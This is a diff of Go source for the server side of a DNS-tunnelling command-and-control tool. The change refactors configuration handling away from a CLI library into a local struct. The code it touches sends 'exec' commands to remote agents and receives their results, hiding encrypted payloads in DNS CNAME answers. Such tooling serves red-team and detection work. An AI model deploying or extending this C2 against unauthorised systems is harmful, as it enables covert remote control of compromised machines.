@@ -17,16 +17,28 @@ import (
 
 	"github.com/miekg/dns"
 	"github.com/mosajjal/dnspot/c2"
-	"github.com/mosajjal/dnspot/conf"
 	"github.com/mosajjal/dnspot/cryptography"
-
-	"github.com/spf13/cobra"
 )
 
-func errorHandler(err error) {
-	if err != nil {
-		panic(err.Error())
-	}
+var Config struct {
+	LogFile                  string
+	OutFile                  string
+	LogLevel                 uint8
+	PrivateKeyBase36         string
+	privateKey               *cryptography.PrivateKey
+	ListenAddress            string
+	EnforceClientKeys        bool
+	AcceptedClientKeysBase36 []string
+	acceptedClientKeys       *[]cryptography.PublicKey
+	DnsSuffix                string
+	Mode                     string
+}
+
+// todo: come up with i/o
+var IO interface {
+	Logger(level uint8, format string, args ...interface{})
+	GetInputFeed() chan string
+	GetOutputFeed() chan string
 }
 
 var ServerPacketBuffersWithSignature = make(map[int][]c2.MessagePacketWithSignature)
@@ -88,7 +100,7 @@ func MessageHealthcheckHandler(Packet c2.MessagePacketWithSignature, q *dns.Msg)
 			TimeStamp:   uint32(time.Now().Unix()),
 			MessageType: agent.NextMessageType,
 		}
-		Answers, _, err := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
+		Answers, _, err := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Packet.Signature)
 		if err != nil {
 			log.Errorf("Error preparing a response for a healthcheck message: %s", err.Error())
 			return err
@@ -135,7 +147,7 @@ func displayCommandResult(fullPayload []byte, signature *cryptography.PublicKey)
 	//todo: this could be a chat coming in from the agent, so "command result" might not be appropiate
 	fmt.Printf("[%s]: %s\n", signature.String(), out)
 	// we only need the result printed in exec mode. in echo mode, this is just a "sent" tickbox
-	if conf.GlobalServerConfig.Mode == "exec" {
+	if Config.Mode == "exec" {
 		fmt.Fprintf(CommandWriter, "command result coming from %s:\n%s\n------\n", signature.String(), string(out))
 	}
 }
@@ -165,7 +177,7 @@ func HandleExecuteCommandResponse(Packet c2.MessagePacketWithSignature, q *dns.M
 	}
 	// log.Infof("sending plyload %#v\n", msg)
 	// time.Sleep(2 * time.Second)
-	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
+	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Packet.Signature)
 	for _, A := range Answers {
 		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
 		if err != nil {
@@ -195,7 +207,7 @@ func HandleExecuteCommandResponse(Packet c2.MessagePacketWithSignature, q *dns.M
 
 func MustSendMsg(msgPacket c2.MessagePacket, agentPublicKey *cryptography.PublicKey, msg string) error {
 	// As part of the incoming packet, we'll get the partid as well as parentPartId so we know which part to send next. we just need to cache the whole partition up
-	Answers, parentPartId, _ := c2.PreparePartitionedPayload(msgPacket, []byte(msg), conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, agentPublicKey)
+	Answers, parentPartId, _ := c2.PreparePartitionedPayload(msgPacket, []byte(msg), Config.DnsSuffix, Config.privateKey, agentPublicKey)
 	//todo: single part messages always have parentPartId = 0, so we need to check if it's single part or multi part and probably don't cache
 	//todo: what are we getting from the client? let's decrypt and log those
 
@@ -234,10 +246,10 @@ func MustSendMsg(msgPacket c2.MessagePacket, agentPublicKey *cryptography.Public
 func SendMessageToAgent(agentPublicKey *cryptography.PublicKey, command string) error {
 	fmt.Fprintf(CommandWriter, "sending message '%s' on %s\n", command, agentPublicKey.String())
 	var cmdType c2.CmdType
-	if conf.GlobalServerConfig.Mode == "chat" {
+	if Config.Mode == "chat" {
 		cmdType = c2.CommandEcho
 	}
-	if conf.GlobalServerConfig.Mode == "exec" {
+	if Config.Mode == "exec" {
 		cmdType = c2.CommandExec
 	}
 	msg := c2.MessagePacket{
@@ -334,7 +346,7 @@ func MessageSetHealthIntervalHandler(Packet c2.MessagePacketWithSignature, q *dn
 	}
 	payload := []byte{}
 	binary.BigEndian.PutUint32(payload, durationMilliseconds)
-	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, Packet.Signature)
+	Answers, _, _ := c2.PreparePartitionedPayload(msg, payload, Config.DnsSuffix, Config.privateKey, Packet.Signature)
 	for _, A := range Answers {
 		cname, err := dns.NewRR(fmt.Sprintf("%s CNAME %s", q.Question[0].Name, A)) //todo:fix the 0 index
 		if err != nil {
@@ -366,7 +378,7 @@ func parseQuery(m *dns.Msg) error {
 		log.Infof("Duplicate message received, discarding")
 		return nil
 	}
-	outs, skip, err := c2.DecryptIncomingPacket(m, conf.GlobalServerConfig.DnsSuffix, conf.GlobalServerConfig.PrivateKey, nil)
+	outs, skip, err := c2.DecryptIncomingPacket(m, Config.DnsSuffix, Config.privateKey, nil)
 	if err != nil {
 		log.Infof("Error in Decrypting incoming packet: %v", err)
 	}
@@ -409,15 +421,17 @@ func handle53(w dns.ResponseWriter, r *dns.Msg) {
 	}
 }
 
-func runDns(cmd *cobra.Command) {
+func runDns() {
 
 	dns.HandleFunc(".", handle53)
 
 	// start server
-	server := &dns.Server{Addr: conf.GlobalServerConfig.ListenAddress, Net: "udp"}
+	server := &dns.Server{Addr: Config.ListenAddress, Net: "udp"}
 	log.Infof("Started DNS on %s -- listening", server.Addr)
 	err := server.ListenAndServe()
-	errorHandler(err)
+	if err != nil {
+		log.Fatalln(err)
+	}
 	if err := server.Shutdown(); err != nil {
 		log.Warnln(err)
 	}
@@ -434,15 +448,14 @@ func First(m map[string]agentStatusForServer) (out string) {
 	return
 }
 
-func RunServer(cmd *cobra.Command, args []string) {
+func RunServer() {
 	// set global flag that we're running as server
-	conf.Mode = conf.RunAsServer
-	log.SetLevel(log.Level(conf.GlobalServerConfig.LogLevel))
-	if conf.GlobalServerConfig.LogLevel >= uint8(log.DebugLevel) {
+	log.SetLevel(log.Level(Config.LogLevel))
+	if Config.LogLevel >= uint8(log.DebugLevel) {
 		log.SetReportCaller(true)
 	}
-	if conf.GlobalServerConfig.LogFile != "" {
-		f, err := os.OpenFile(conf.GlobalServerConfig.LogFile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
+	if Config.LogFile != "" {
+		f, err := os.OpenFile(Config.LogFile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
 		if err != nil {
 			log.Fatalf("error opening file: %v", err)
 		}
@@ -452,8 +465,8 @@ func RunServer(cmd *cobra.Command, args []string) {
 		log.SetOutput(os.Stdout)
 	}
 
-	if conf.GlobalServerConfig.OutFile != "" {
-		f, err := os.OpenFile(conf.GlobalServerConfig.OutFile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
+	if Config.OutFile != "" {
+		f, err := os.OpenFile(Config.OutFile, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
 		if err != nil {
 			log.Fatalf("error opening file: %v", err)
 		}
@@ -463,29 +476,23 @@ func RunServer(cmd *cobra.Command, args []string) {
 	}
 
 	var err error
-	conf.GlobalServerConfig.ListenAddress, err = cmd.Flags().GetString("listenAddress")
-	errorHandler(err)
+	Config.privateKey, err = cryptography.PrivateKeyFromString(Config.PrivateKeyBase36)
+	if err != nil {
+		log.Fatalln(err)
+	}
 
-	conf.GlobalServerConfig.PrivateKeyBasexx, err = cmd.Flags().GetString("privateKey")
-	errorHandler(err)
-	conf.GlobalServerConfig.PrivateKey, err = cryptography.PrivateKeyFromString(conf.GlobalServerConfig.PrivateKeyBasexx)
-	errorHandler(err)
-
-	log.Infof("Use the following public key to connect clients: %s", conf.GlobalServerConfig.PrivateKey.GetPublicKey().String())
+	log.Infof("Use the following public key to connect clients: %s", Config.privateKey.GetPublicKey().String())
 
 	// todo: public keys
 
-	dnsSuffix, err := cmd.Flags().GetString("dnsSuffix")
-	errorHandler(err)
-	if !strings.HasSuffix(dnsSuffix, ".") {
-		dnsSuffix = dnsSuffix + "."
+	if !strings.HasSuffix(Config.DnsSuffix, ".") {
+		Config.DnsSuffix = Config.DnsSuffix + "."
 	}
-	if !strings.HasPrefix(dnsSuffix, ".") {
-		dnsSuffix = "." + dnsSuffix
+	if !strings.HasPrefix(Config.DnsSuffix, ".") {
+		Config.DnsSuffix = "." + Config.DnsSuffix
 	}
-	conf.GlobalServerConfig.DnsSuffix = dnsSuffix
 
-	go runDns(cmd)
+	go runDns()
 
 	go func() {
 		reader := bufio.NewReader(os.Stdin)
